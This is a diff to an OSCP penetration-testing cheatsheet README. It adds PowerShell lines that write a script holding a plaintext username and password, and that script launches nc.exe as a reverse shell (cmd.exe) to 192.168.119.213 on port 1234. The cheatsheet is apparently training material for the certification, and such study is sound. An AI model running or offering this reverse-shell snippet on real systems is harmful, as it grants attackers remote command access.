@@ -1,3 +1,10 @@
+echo $username = "alice" > startprocess.ps1
+echo $password = "aliceishere" >> startprocess.ps1
+echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
+echo Start-Process "C:\Users\public\nc.exe" -ArgumentList "-e cmd.exe 192.168.119.213 1234"  -Credential $credential >> startprocess.ps1
+
+
 # OSCP Cheatsheet
 
 The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 
